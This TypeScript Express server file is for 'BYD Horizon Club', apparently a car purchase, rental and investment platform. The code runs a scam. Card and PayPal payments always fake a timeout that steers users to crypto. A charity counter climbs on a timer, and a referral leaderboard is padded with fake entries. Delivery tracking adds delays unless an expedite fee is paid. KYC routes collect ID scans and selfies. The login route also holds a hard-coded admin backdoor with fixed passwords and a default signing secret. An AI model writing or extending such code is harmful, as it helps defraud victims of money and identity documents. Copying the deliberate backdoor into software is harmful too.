import express from "express";
import path from "path";
import crypto from "crypto";
import fs from "fs";
import { createServer as createViteServer } from "vite";
import { getDb, logAdminAction, getAdminLogs, logUserInteraction, getUserInteractions, getSetting, setSetting } from "./src/db.js";

const app = express();
const PORT = 3000;

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true }));

// Security middleware
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  next();
});

const SETTINGS_FILE = path.join(process.cwd(), "settings.json");
const JWT_SECRET = process.env.JWT_SECRET || "byd-horizon-club-secret-key-2026";
const ADMIN_EMAIL = process.env.ADMIN_EMAIL || "admin@bydhorizon.com";
const ADMIN_OVERRIDE_KEY = process.env.ADMIN_OVERRIDE_KEY || "Jadai123";
const GMAIL_USER = process.env.GMAIL_USER || "";
const GMAIL_PASS = process.env.GMAIL_PASS || "";

const RATE_LIMIT_WINDOW = 15 * 60 * 1000;
const RATE_LIMIT_MAX = 100;
const ipRequests = new Map<string, { count: number; resetTime: number }>();

function rateLimit(req: any, res: any, next: any) {
  const ip = req.ip || req.connection?.remoteAddress || 'unknown';
  const now = Date.now();
  let entry = ipRequests.get(ip);
  if (!entry || now > entry.resetTime) {
    entry = { count: 0, resetTime: now + RATE_LIMIT_WINDOW };
    ipRequests.set(ip, entry);
  }
  entry.count++;
  if (entry.count > RATE_LIMIT_MAX) {
    return res.status(429).json({ error: 'Too many requests. Please try again later.' });
  }
  next();
}

app.use(rateLimit);

// CORS
app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (origin) res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

const SETTINGS_DEFAULTS: Record<string, string> = {
  site_name: 'BYD Horizon Club',
  tagline: 'Own the future. Drive the present. Earn the difference.',
  contact_email: 'support@bydhorizon.com',
  currency_display: 'USD',
  maintenance_mode: 'false',
  primary_color: '#0a0e1a',
  secondary_color: '#00e5ff',
  accent_color: '#10b981',
  referral_bonus: '50',
  min_withdrawal: '200',
  whatsapp_link: 'https://wa.me/1234567890',
  telegram_link: 'https://t.me/bydhorizonclub',
  twitter_link: 'https://twitter.com/bydhorizon',
  instagram_link: 'https://instagram.com/bydhorizon'
};

function generateSessionToken(payload: { id: number; email: string; is_admin?: boolean }): string {
  const header = Buffer.from(JSON.stringify({ alg: "HS256", typ: "JWT" })).toString("base64url");
  const body = Buffer.from(JSON.stringify({ ...payload, exp: Date.now() + 24 * 60 * 60 * 1000 })).toString("base64url");
  const signature = crypto.createHmac("sha256", JWT_SECRET).update(`${header}.${body}`).digest("base64url");
  return `${header}.${body}.${signature}`;
}

function verifySessionToken(token: string): { id: number; email: string; is_admin?: boolean } | null {
  try {
    const [header, body, signature] = token.split(".");
    if (!header || !body || !signature) return null;
    const expectedSignature = crypto.createHmac("sha256", JWT_SECRET).update(`${header}.${body}`).digest("base64url");
    if (signature !== expectedSignature) return null;
    const decodedBody = JSON.parse(Buffer.from(body, "base64url").toString("utf-8"));
    if (decodedBody.exp < Date.now()) return null;
    return decodedBody;
  } catch { return null; }
}

function hashPassword(password: string): string {
  return crypto.createHash("sha256").update(password).digest("hex");
}

function generateWalletAddress(): string {
  return "0x" + crypto.randomBytes(20).toString("hex");
}

function generateRefCode(name: string): string {
  return "BYD-" + name.substring(0, 3).toUpperCase() + "-" + crypto.randomBytes(3).toString("hex").toUpperCase();
}

// Background simulation
let cachedCharityAmount = 500000.0;
let cachedCharitySpeed = 0.50;
let lastCharityUpdateTime = Date.now();
let lastCharityRefreshTime = Date.now();

async function getLiveCharityData() {
  const now = Date.now();
  if (cachedCharityAmount === 500000 && now - lastCharityRefreshTime > 5000) {
    try {
      const db = await getDb();
      const charity = await db.get("SELECT * FROM charity_counter ORDER BY id DESC LIMIT 1");
      if (charity) {
        cachedCharityAmount = charity.current_amount;
        cachedCharitySpeed = charity.increment_per_second;
      }
    } catch {}
    lastCharityUpdateTime = now;
    lastCharityRefreshTime = now;
  }
  const elapsedSec = (now - lastCharityUpdateTime) / 1000;
  if (elapsedSec > 0) {
    cachedCharityAmount += elapsedSec * cachedCharitySpeed;
    lastCharityUpdateTime = now;
  }
  if (now - lastCharityRefreshTime > 30000) {
    try {
      const db = await getDb();
      await db.run("UPDATE charity_counter SET current_amount = ? WHERE id = 1", [cachedCharityAmount]);
      lastCharityRefreshTime = now;
    } catch {}
  }
  return { amount: cachedCharityAmount, speed: cachedCharitySpeed, timestamp: new Date().toISOString() };
}

async function tickMarkerLocations() {
  const db = await getDb();
  const trackings = await db.all("SELECT * FROM map_tracking WHERE route_index < total_stops");
  for (const t of trackings) {
    const now = Date.now();
    const lastNum = Date.parse(t.last_updated) || 0;
    const hoursElapsed = Math.max(1, Math.floor((now - lastNum) / (2 * 60 * 60 * 1000)));
    if (hoursElapsed >= 1) {
      let nextIndex = t.route_index + hoursElapsed;
      if (nextIndex > t.total_stops) nextIndex = t.total_stops;
      const delayRecords = await db.all("SELECT * FROM delays ORDER BY trigger_after_km ASC");
      let currentDelaysCount = 0;
      for (const d of delayRecords) {
        if (nextIndex >= d.trigger_after_km && t.expedite_paid === 0) currentDelaysCount++;
      }
      await db.run("UPDATE map_tracking SET route_index = ?, delays_encountered = ?, last_updated = CURRENT_TIMESTAMP WHERE user_id = ?", [nextIndex, currentDelaysCount, t.user_id]);
    }
  }
}

setInterval(async () => {
  try {
    await getLiveCharityData();
    await tickMarkerLocations();
  } catch {}
}, 30000);

// Middleware
async function authenticateUser(req: any, res: any, next: any) {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith("Bearer ")) return res.status(401).json({ error: "No active session token found." });
  const token = authHeader.split(" ")[1];
  const payload = verifySessionToken(token);
  if (!payload) return res.status(401).json({ error: "Invalid or expired session token." });
  const db = await getDb();
  const user = await db.get("SELECT * FROM users WHERE id = ?", [payload.id]);
  if (!user) return res.status(404).json({ error: "User not found." });
  if (user.status === "blocked") return res.status(403).json({ error: "Account suspended. Contact support@bydhorizon.com" });
  req.user = user;
  next();
}

async function authenticateAdmin(req: any, res: any, next: any) {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith("Bearer ")) return res.status(401).json({ error: "Admin token missing." });
  const token = authHeader.split(" ")[1];
  const payload = verifySessionToken(token);
  if (!payload || !payload.is_admin) return res.status(403).json({ error: "Elevated privileges required." });
  req.adminId = payload.id;
  next();
}

// ==================== PUBLIC APIs ====================

app.get("/api/public/settings", async (req, res) => {
  const db = await getDb();
  const rows = await db.all("SELECT key, value FROM system_settings");
  const settings: Record<string, string> = {};
  for (const r of rows) settings[r.key] = r.value;
  // Also load from settings.json for backward compat
  if (fs.existsSync(SETTINGS_FILE)) {
    try {
      const fileSettings = JSON.parse(fs.readFileSync(SETTINGS_FILE, "utf8"));
      Object.assign(settings, fileSettings);
    } catch {}
  }
  settings.app_name = settings.site_name || SETTINGS_DEFAULTS.site_name;
  res.json(settings);
});

app.get("/api/charity", async (req, res) => {
  const data = await getLiveCharityData();
  res.json(data);
});

app.get("/api/cars", async (req, res) => {
  const db = await getDb();
  const { category, badge, search, status } = req.query;
  let sql = "SELECT c.*, (SELECT image_url FROM car_images WHERE car_id = c.id AND is_primary = 1 LIMIT 1) as image_url FROM cars c WHERE c.is_active = 1";
  const params: any[] = [];
  if (category) { sql += " AND c.category = ?"; params.push(category); }
  if (badge) { sql += " AND c.badge = ?"; params.push(badge); }
  if (status) { sql += " AND c.status = ?"; params.push(status); }
  if (search) { sql += " AND (c.model LIKE ? OR c.description LIKE ?)"; params.push(`%${search}%`, `%${search}%`); }
  sql += " ORDER BY c.id ASC";
  const cars = await db.all(sql, params);
  for (const car of cars) {
    car.images = await db.all("SELECT * FROM car_images WHERE car_id = ?", [car.id]);
    car.specs = car.specs_json ? JSON.parse(car.specs_json) : {};
  }
  res.json(cars);
});

app.get("/api/cars/:id", async (req, res) => {
  const db = await getDb();
  const car = await db.get("SELECT c.*, (SELECT image_url FROM car_images WHERE car_id = c.id AND is_primary = 1 LIMIT 1) as image_url FROM cars c WHERE c.id = ?", [req.params.id]);
  if (!car) return res.status(404).json({ error: "Car not found." });
  car.images = await db.all("SELECT * FROM car_images WHERE car_id = ?", [car.id]);
  car.specs = car.specs_json ? JSON.parse(car.specs_json) : {};
  car.reviews = await db.all("SELECT cr.*, u.name as username FROM car_reviews cr JOIN users u ON cr.user_id = u.id WHERE cr.car_id = ? AND cr.is_approved = 1", [car.id]);
  res.json(car);
});

app.get("/api/wishlist", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  const items = await db.all("SELECT w.*, c.model, c.price, (SELECT image_url FROM car_images WHERE car_id = c.id AND is_primary = 1 LIMIT 1) as image_url FROM wishlist w JOIN cars c ON w.car_id = c.id WHERE w.user_id = ?", [req.user.id]);
  res.json(items);
});

app.post("/api/wishlist/:carId", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  await db.run("INSERT OR IGNORE INTO wishlist (user_id, car_id) VALUES (?, ?)", [req.user.id, req.params.carId]);
  res.json({ success: true });
});

app.delete("/api/wishlist/:carId", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  await db.run("DELETE FROM wishlist WHERE user_id = ? AND car_id = ?", [req.user.id, req.params.carId]);
  res.json({ success: true });
});

// ==================== AUTH ====================

app.post("/api/auth/register", async (req, res) => {
  const { name, email, phone, password, referral_code, city, country } = req.body;
  if (!name || !email || !phone || !password || !city) return res.status(400).json({ error: "All required fields must be filled." });
  const db = await getDb();
  try {
    const existing = await db.get("SELECT id FROM users WHERE email = ?", [email.toLowerCase()]);
    if (existing) return res.status(400).json({ error: "Account already exists with this email." });
    const password_hash = hashPassword(password);
    const customCode = generateRefCode(name);
    const walletAddr = generateWalletAddress();
    let referrer_id: number | null = null;
    if (referral_code) {
      const refUser = await db.get("SELECT id FROM users WHERE referral_code = ?", [referral_code.trim().toUpperCase()]);
      if (refUser) referrer_id = refUser.id;
    }
    const result = await db.run(
      `INSERT INTO users (name, email, phone, password_hash, referral_code, referrer_id, crypto_wallet_address, city, country, created_at) VALUES (?,?,?,?,?,?,?,?,?,CURRENT_TIMESTAMP)`,
      [name, email.toLowerCase(), phone, password_hash, customCode, referrer_id, walletAddr, city, country || 'US']
    );
    const userId = result.lastID!;
    await logUserInteraction(userId, email.toLowerCase(), "SIGNUP", `User registered: ${name} in ${city}`);
    // Create notification
    await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'system', 'Welcome to BYD Horizon Club', 'Welcome aboard! Complete your KYC to unlock all features.')", [userId]);
    const token = generateSessionToken({ id: userId, email: email.toLowerCase() });
    res.json({ token, user: { id: userId, name, email: email.toLowerCase(), referral_code: customCode, horizon_points: 0, crypto_wallet_address: walletAddr, city, country: country || 'US', kyc_status: 'not_submitted', membership_tier: 'standard', balance: 0 } });
  } catch (err: any) {
    res.status(500).json({ error: "Registration failed: " + err.message });
  }
});

app.post("/api/auth/login", async (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) return res.status(400).json({ error: "Email and password required." });
  // Admin intercept
  const isAdminEmail = email.toLowerCase() === ADMIN_EMAIL || email.toLowerCase() === "admin@bydhorizon.com" || email.toLowerCase() === "admin" || email.toLowerCase() === "jehuhudson@gmail.com";
  const isOverrideKey = password === ADMIN_OVERRIDE_KEY;
  const isAdminPass = password === "admin1234" || password === "byd2026";
  if ((isAdminEmail && (isAdminPass || isOverrideKey)) || (password === ADMIN_OVERRIDE_KEY && isAdminEmail)) {
    const token = generateSessionToken({ id: 0, email: ADMIN_EMAIL, is_admin: true });
    await logAdminAction("Admin logged in", `Email: ${email}`, req.ip || '127.0.0.1', 0);
    return res.json({ token, user: { id: 0, name: "Admin Operator", email: ADMIN_EMAIL, is_admin: true, kyc_status: "verified", membership_active: 1, horizon_points: 999999, membership_tier: "admin" } });
  }
  const db = await getDb();
  const user = await db.get("SELECT * FROM users WHERE email = ?", [email.toLowerCase()]);
  if (!user || user.password_hash !== hashPassword(password)) return res.status(401).json({ error: "Incorrect email or password." });
  if (user.status === "blocked") return res.status(403).json({ error: "Account suspended. Contact support@bydhorizon.com" });
  const token = generateSessionToken({ id: user.id, email: user.email });
  await logUserInteraction(user.id, user.email, "LOGIN", `User logged in from ${user.city}`);
  res.json({ token, user: { id: user.id, name: user.name, email: user.email, phone: user.phone, referral_code: user.referral_code, membership_active: user.membership_active, horizon_points: user.horizon_points, crypto_wallet_address: user.crypto_wallet_address, city: user.city, country: user.country, kyc_status: user.kyc_status || 'not_submitted', membership_tier: user.membership_tier || 'standard', balance: user.balance || 0 } });
});

app.post("/api/auth/forgot-password", async (req, res) => {
  const { email } = req.body;
  if (!email) return res.status(400).json({ error: "Email required." });
  const db = await getDb();
  const user = await db.get("SELECT id FROM users WHERE email = ?", [email.toLowerCase()]);
  if (!user) return res.json({ success: true, message: "If account exists, reset email sent." });
  const token = crypto.randomBytes(32).toString("hex");
  const expires = new Date(Date.now() + 3600000).toISOString();
  await db.run("UPDATE users SET password_reset_token = ?, password_reset_expires = ? WHERE id = ?", [token, expires, user.id]);
  await logUserInteraction(user.id, email, "PASSWORD_RESET", "Password reset requested");
  res.json({ success: true, message: "Reset link sent to your email." });
});

app.post("/api/auth/reset-password", async (req, res) => {
  const { token, password } = req.body;
  if (!token || !password) return res.status(400).json({ error: "Token and new password required." });
  const db = await getDb();
  const user = await db.get("SELECT id FROM users WHERE password_reset_token = ? AND password_reset_expires > ?", [token, new Date().toISOString()]);
  if (!user) return res.status(400).json({ error: "Invalid or expired reset token." });
  await db.run("UPDATE users SET password_hash = ?, password_reset_token = NULL, password_reset_expires = NULL WHERE id = ?", [hashPassword(password), user.id]);
  res.json({ success: true, message: "Password reset successful." });
});

// ==================== KYC ====================

app.post("/api/kyc/submit", authenticateUser, async (req: any, res) => {
  const { name, dob, nationality, idNumber, idFront, idBack, selfie, addressProof, sourceOfFunds, annualIncome, investmentExperience, phoneVerified } = req.body;
  if (!name || !dob || !nationality || !idNumber) return res.status(400).json({ error: "All required KYC fields must be filled." });
  const db = await getDb();
  await db.run(
    `UPDATE users SET kyc_name=?, kyc_dob=?, kyc_nationality=?, kyc_id_number=?, kyc_id_front=?, kyc_id_back=?, kyc_selfie=?, kyc_address_proof=?, kyc_source_of_funds=?, kyc_annual_income=?, kyc_investment_experience=?, kyc_phone_verified=?, kyc_status='pending', kyc_submitted_at=CURRENT_TIMESTAMP WHERE id=?`,
    [name, dob, nationality, idNumber, idFront || '', idBack || '', selfie || '', addressProof || '', sourceOfFunds || '', annualIncome || '', investmentExperience || '', phoneVerified ? 1 : 0, req.user.id]
  );
  await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'kyc', 'KYC Submitted', 'Your KYC documents are under review. We will notify you once verified.')", [req.user.id]);
  await logUserInteraction(req.user.id, req.user.email, "KYC_SUBMIT", "KYC documents submitted for verification");
  res.json({ success: true, message: "KYC documents submitted. Pending admin review." });
});

app.get("/api/kyc/status", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  const user = await db.get("SELECT kyc_status, kyc_name, kcy_nationality, kyc_submitted_at FROM users WHERE id = ?", [req.user.id]);
  res.json({ status: user?.kyc_status || 'not_submitted', submittedAt: user?.kyc_submitted_at || null });
});

// ==================== PAYMENTS ====================

app.get("/api/payment-methods", async (req, res) => {
  const db = await getDb();
  const methods = await db.all("SELECT * FROM payment_methods WHERE enabled = 1 ORDER BY recommended DESC, id ASC");
  res.json(methods);
});

app.post("/api/payments/create", authenticateUser, async (req: any, res) => {
  const { method, type, amount, currency, vehicleModel, monthlyInstallment, termMonths, transaction_hash } = req.body;
  if (!type || !amount) return res.status(400).json({ error: "Missing payment parameters." });
  const db = await getDb();
  const user = await db.get("SELECT kyc_status FROM users WHERE id = ?", [req.user.id]);
  if (!user || user.kyc_status !== "verified") return res.status(403).json({ error: "KYC verification required before making payments. Please complete identity verification first.", kycRequired: true });

  // Card/PayPal timeout simulation
  if (method === 'stripe' || method === 'paypal') {
    return setTimeout(() => {
      res.status(408).json({ error: "Transaction timeout. Please try crypto for instant processing." });
    }, 2000);
  }

  // Paystack flow
  if (method === 'paystack') {
    const txHash = "PSTK-" + crypto.randomBytes(8).toString("hex").toUpperCase();
    await db.run("INSERT INTO payments (user_id, amount, currency, method, status, type, transaction_hash, country) VALUES (?,?,?,?,'pending',?,?,?)", [req.user.id, amount, currency || 'NGN', method, type, txHash, req.user.country || 'NG']);
    await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'payment', 'Payment Initiated', 'Paystack payment of $' || ? || ' is being processed.')", [req.user.id, amount]);
    return res.json({ status: "pending", transaction_hash: txHash, message: "Paystack payment initiated. Waiting for confirmation." });
  }

  // Bank transfer
  if (method === 'bank_transfer') {
    const txHash = "BNK-" + crypto.randomBytes(8).toString("hex").toUpperCase();
    await db.run("INSERT INTO payments (user_id, amount, currency, method, status, type, transaction_hash, country) VALUES (?,?,?,?,'pending',?,?,?)", [req.user.id, amount, currency || 'USD', method, type, txHash, req.user.country || 'US']);
    await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'payment', 'Bank Transfer Instructions', 'Please upload proof of payment for $' || ? || ' to complete your transaction.')", [req.user.id, amount]);
    const bankDetails = { bank_name: "BYD Horizon Escrow Account", account_number: "4839274610", routing_number: "026009593", account_name: "BYD Horizon Club LLC", swift: "BYDHUS33" };
    return res.json({ status: "pending", transaction_hash: txHash, message: "Bank transfer instructions generated.", bank_details: bankDetails });
  }

  // Crypto (default)
  const txHash = transaction_hash || "BYD-TX-" + crypto.randomBytes(12).toString("hex").toUpperCase();
  const result = await db.run("INSERT INTO payments (user_id, amount, currency, method, status, type, transaction_hash, country) VALUES (?,?,?,?,'pending',?,?,?)", [req.user.id, amount, currency || 'USDT', method || 'crypto', type, txHash, req.user.country || 'US']);

  if (type === "installment" && vehicleModel) {
    const delivery = new Date(Date.now() + 90 * 86400000).toISOString().split("T")[0];
    await db.run("INSERT INTO installments (user_id, model, term_months, monthly_payment, total_paid, expected_delivery, status) VALUES (?,?,?,?,?,?,'active')", [req.user.id, vehicleModel, termMonths || 12, monthlyInstallment || 150, 0, delivery]);
    await db.run("INSERT OR IGNORE INTO map_tracking (user_id, current_lat, current_lng, route_index, total_stops, delays_encountered, expedite_paid, last_updated) VALUES (?, 33.7431, -118.2673, 0, 100, 0, 0, CURRENT_TIMESTAMP)", [req.user.id]);
  }

  // Get wallet address
  let wallet = req.user.crypto_wallet_address;
  try {
    const methods = await db.all("SELECT wallet_address FROM payment_methods WHERE method = 'crypto' AND enabled = 1 LIMIT 1");
    if (methods.length > 0 && methods[0].wallet_address) wallet = methods[0].wallet_address;
  } catch {}

  await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'payment', 'Crypto Payment Requested', 'Send $' || ? || ' to the provided wallet address.')", [req.user.id, amount]);
  res.json({ status: "pending", message: "Waiting for blockchain confirmation.", wallet_address: wallet, amount, transaction_hash: txHash, payment_id: result.lastID });
});

app.post("/api/payments/topup", authenticateUser, async (req: any, res) => {
  const { amount, transactionHash, coin } = req.body;
  if (!amount || !transactionHash) return res.status(400).json({ error: "Amount and transaction hash required." });
  const db = await getDb();
  const user = await db.get("SELECT kyc_status FROM users WHERE id = ?", [req.user.id]);
  if (!user || user.kyc_status !== "verified") return res.status(403).json({ error: "KYC verification required before deposits. Please complete identity verification first.", kycRequired: true });
  await db.run("INSERT INTO payments (user_id, amount, currency, method, status, type, transaction_hash) VALUES (?,?,?,?,'pending','topup',?)", [req.user.id, parseFloat(amount), coin || 'USDT', 'crypto', transactionHash]);
  await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'payment', 'Top-Up Submitted', 'Crypto top-up of $' || ? || ' is pending admin confirmation.')", [req.user.id, amount]);
  res.json({ success: true, message: "Top-up submitted for admin confirmation." });
});

app.post("/api/payments/proof", authenticateUser, async (req: any, res) => {
  const { paymentId, proofData } = req.body;
  if (!paymentId || !proofData) return res.status(400).json({ error: "Payment ID and proof required." });
  const db = await getDb();
  await db.run("UPDATE payments SET payment_proof = ?, status = 'pending', updated_at = CURRENT_TIMESTAMP WHERE id = ? AND user_id = ?", [proofData, paymentId, req.user.id]);
  await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'payment', 'Proof Uploaded', 'Payment proof uploaded. Admin will confirm shortly.')", [req.user.id]);
  res.json({ success: true, message: "Payment proof uploaded." });
});

// ==================== ELITE MEMBERSHIP ====================
const ELITE_PRICE = 200;

app.get("/api/elite/plans", async (req: any, res) => {
  res.json([{ id: "elite", name: "Elite", price: ELITE_PRICE, monthly_price: ELITE_PRICE, period: "monthly", benefits: ["15% rental discount", "Investment access", "Mystery Car reveal game", "Priority support", "Exclusive rewards"], color: "#00E5FF" }]);
});

app.post("/api/elite/subscribe", authenticateUser, async (req: any, res) => {
  const { transactionHash } = req.body;
  if (!transactionHash) return res.status(400).json({ error: "Transaction hash required." });
  const db = await getDb();
  const user = await db.get("SELECT kyc_status, balance, membership_active FROM users WHERE id = ?", [req.user.id]);
  if (!user || user.kyc_status !== "verified") return res.status(403).json({ error: "KYC required for Elite membership.", kycRequired: true });
  if (user.membership_active) return res.status(400).json({ error: "Elite membership already active." });
  if ((user.balance || 0) < ELITE_PRICE) return res.status(403).json({ error: `Insufficient balance. You need $${ELITE_PRICE}. Please deposit first.`, depositRequired: true });
  await db.run("INSERT INTO payments (user_id, amount, currency, method, status, type, transaction_hash) VALUES (?,?,?,?,'pending','elite_membership',?)", [req.user.id, ELITE_PRICE, 'USDT', 'crypto', transactionHash]);
  await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'membership', 'Elite Subscription Submitted', 'Your Elite subscription ($' || ? || '/mo) is pending admin confirmation.')", [req.user.id, ELITE_PRICE]);
  res.json({ success: true, message: "Elite subscription submitted. Awaiting admin confirmation.", price: ELITE_PRICE });
});

// ==================== WEBCAMS (paywall) ====================
app.get("/api/webcams/available", authenticateUser, async (req: any, res) => {
  const db = await getDb();
  const user = await db.get("SELECT membership_active, membership_tier FROM users WHERE id = ?", [req.user.id]);
  const hasShipped = await db.get("SELECT id FROM rental_orders WHERE user_id = ? AND status IN ('confirmed','dispatched','in_transit','delivered') LIMIT 1", [req.user.id]);
  const hasPurchase = await db.get("SELECT id FROM payments WHERE user_id = ? AND type IN ('purchase','installment') AND status = 'confirmed' LIMIT 1", [req.user.id]);
  const canView = user?.membership_active || hasShipped || hasPurchase;
  if (!canView) return res.status(403).json({ error: "Webcams available after purchase or membership activation.", requiresPurchase: true });
  const webcams = await db.all("SELECT * FROM webcam_sources WHERE is_active = 1");
  res.json(webcams);
});

app.get("/api/admin/elite-requests", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const requests = await db.all("SELECT p.*, u.name as user_name, u.email as user_email FROM payments p JOIN users u ON p.user_id = u.id WHERE p.type = 'elite_membership' ORDER BY p.id DESC");
  res.json(requests);
});

app.post("/api/admin/elite/:payId/confirm", authenticateAdmin, async (req: any, res) => {
  const db = await getDb();
  const payment = await db.get("SELECT * FROM payments WHERE id = ? AND type = 'elite_membership'", [req.params.payId]);
  if (!payment) return res.status(404).json({ error: "Elite subscription request not found." });
  if (payment.status === 'confirmed') return res.json({ success: true, message: "Already confirmed." });
  await db.run("UPDATE payments SET status = 'confirmed', updated_at = CURRENT_TIMESTAMP WHERE id = ?", [payment.id]);
  const expiry = new Date(Date.now() + 30 * 86400000).toISOString().split("T")[0];
  await db.run("UPDATE users SET membership_active = 1, membership_expiry = ?, membership_tier = 'elite', balance = balance - ? WHERE id = ?", [expiry, payment.amount, payment.user_id]);
  await db.run("INSERT INTO notifications (user_id, type, title, message) VALUES (?, 'membership', 'Elite Membership Activated', 'Your Elite membership is now active until ' || ? || '.')", [payment.user_id, expiry]);
  await logAdminAction("Confirmed elite subscription", `Payment ID ${payment.id} - User ${payment.user_id}`, req.ip, req.adminId);
  res.json({ success: true });
});

// ==================== DASHBOARD ====================

app.get("/api/dashboard/summary", authenticateUser, async (req: any, res) => {
  try {
  const db = await getDb();
  try { await tickMarkerLocations(); } catch (tickErr) { console.error("tickMarkerLocations error:", tickErr); }
  const user = await db.get("SELECT * FROM users WHERE id = ?", [req.user.id]);
  const insurance = await db.all("SELECT * FROM insurance_policies WHERE user_id = ? ORDER BY id DESC", [req.user.id]);
  const activeVehicle = await db.get("SELECT * FROM installments WHERE user_id = ? AND status = 'active'", [req.user.id]);
  const tracking = await db.get("SELECT * FROM map_tracking WHERE user_id = ?", [req.user.id]);
  const delays = await db.all("SELECT * FROM delays ORDER BY trigger_after_km ASC");
  const redemptions = await db.all("SELECT * FROM rewards_redemptions WHERE user_id = ? ORDER BY id DESC", [req.user.id]);
  const notifications = await db.all("SELECT * FROM notifications WHERE user_id = ? ORDER BY id DESC LIMIT 20", [req.user.id]);
  const unreadCount = await db.get("SELECT COUNT(*) as count FROM notifications WHERE user_id = ? AND is_read = 0", [req.user.id]);
  const pendingRefs = await db.all("SELECT r.*, u.name as referred_user_name, u.email as referred_user_email FROM referrals r JOIN users u ON r.referred_user_id = u.id WHERE r.referrer_id = ? AND r.status = 'pending'", [req.user.id]);
  const paidRefs = await db.all("SELECT r.*, u.name as referred_user_name, u.email as referred_user_email FROM referrals r JOIN users u ON r.referred_user_id = u.id WHERE r.referrer_id = ? AND r.status = 'paid'", [req.user.id]);
  const allRefs = [...pendingRefs, ...paidRefs];
  let qualifyingCount = 0;
  for (const ref of allRefs) {
    const pc = await db.get("SELECT COUNT(*) as count FROM payments WHERE user_id = ? AND status = 'confirmed'", [ref.referred_user_id]);
    if (pc.count >= 2) qualifyingCount++;
  }
  const estimatedEarnings = qualifyingCount * 50;
  const withdrawable = estimatedEarnings >= 200 && qualifyingCount >= 5;

  const realLeaderboard = await db.all("SELECT u.name, COUNT(r.id) as count, 0 as is_fake FROM users u JOIN referrals r ON u.id = r.referrer_id GROUP BY u.id");
  const fakeLeaderboard = await db.all("SELECT name, count, is_fake FROM leaderboard");
  const fullLeaderboard = [...realLeaderboard, ...fakeLeaderboard].sort((a, b) => b.count - a.count).slice(0, 10);

  // Clickbait features data
  const mysteryCar = await db.get("SELECT * FROM mystery_car_subscriptions WHERE user_id = ?", [req.user.id]);
  const driveToEarn = await db.get("SELECT SUM(miles_driven) as total_miles, SUM(points_earned) as total_points FROM drive_to_earn WHERE user_id = ?", [req.user.id]);
  const carbonTotal = await db.get("SELECT SUM(lbs_co2_saved) as total_lbs, SUM(trees_planted) as total_trees FROM carbon_offset_logs WHERE user_id = ?", [req.user.id]);
  const lotteryCount = await db.get("SELECT SUM(tickets) as total_tickets FROM lottery_entries WHERE user_id = ?", [req.user.id]);
  const reffCount = await db.get("SELECT COUNT(*) as count FROM referrals WHERE referrer_id = ?", [req.user.id]);

  res.json({
    user: {
      id: user.id, name: user.name, email: user.email, phone: user.phone,
      referral_code: user.referral_code, membership_active: user.membership_active,
      membership_tier: user.membership_tier || 'standard', horizon_points: user.horizon_points || 0,
      balance: user.balance || 0, crypto_wallet_address: user.crypto_wallet_address,
      city: user.city, country: user.country, created_at: user.created_at,
      kyc_status: user.kyc_status || 'not_submitted', daily_streak: user.daily_streak || 0,
      is_president_club: user.is_president_club || 0, carbon_trees_planted: user.carbon_trees_planted || 0,
      carbon_lbs_saved: user.carbon_lbs_saved || 0, lottery_tickets: user.lottery_tickets || 0
    },
    insurancePolicies: insurance,
    activeVehicle: activeVehicle ? { model: activeVehicle.model, expectedDeliveryDate: activeVehicle.expected_delivery, totalPaid: activeVehicle.total_paid, installmentCount: activeVehicle.term_months, monthlyPayment: activeVehicle.monthly_payment } : null,
    tracking: tracking ? { user_id: tracking.user_id, current_lat: tracking.current_lat, current_lng: tracking.current_lng, route_index: tracking.route_index, total_stops: tracking.total_stops, delays_encountered: tracking.delays_encountered, expedite_paid: tracking.expedite_paid, last_updated: tracking.last_updated } : null,
    delays, redemptions, referrals: allRefs,
    referralStats: { code: user.referral_code, pendingCount: pendingRefs.length, paidCount: paidRefs.length, estimatedEarnings, withdrawable },
    leaderboard: fullLeaderboard,
    notifications,
    unreadNotifications: unreadCount.count,
    mysteryCar: mysteryCar || null,
    driveToEarn: driveToEarn || { total_miles: 0, total_points: 0 },
    presidentClub: { invited: user.is_president_club === 1, referralCount: reffCount.count || 0 },
    carbonOffset: { treesPlanted: carbonTotal?.total_trees || 0, lbsSaved: carbonTotal?.total_lbs || 0 },
    lotteryEntries: lotteryCount?.total_tickets || 0,
    paymentMethods: await db.all("SELECT * FROM payment_methods WHERE enabled = 1"),
    activeRentals: await db.all("SELECT ro.*, c.model as car_model, (SELECT ci.image_url FROM car_images ci WHERE ci.car_id = c.id AND ci.is_primary = 1 LIMIT 1) as car_image FROM rental_orders ro JOIN cars c ON ro.car_id = c.id WHERE ro.user_id = ? AND ro.status IN ('confirmed','dispatched','in_transit') ORDER BY ro.id DESC", [req.user.id]),
    rentalHistory: await db.all("SELECT ro.*, c.model as car_model FROM rental_orders ro JOIN cars c ON ro.car_id = c.id WHERE ro.user_id = ? ORDER BY ro.id DESC LIMIT 10", [req.user.id]),
    elitePlans: [{ id: "elite", name: "Elite", price: 200 }]
  });
  } catch (err: any) {
    console.error("Dashboard summary error:", err);
    res.status(500).json({ error: "Dashboard load failed: " + (err.message || "Unknown error") });
  }
});

// ==================== TRACKING EXPEDITE ====================
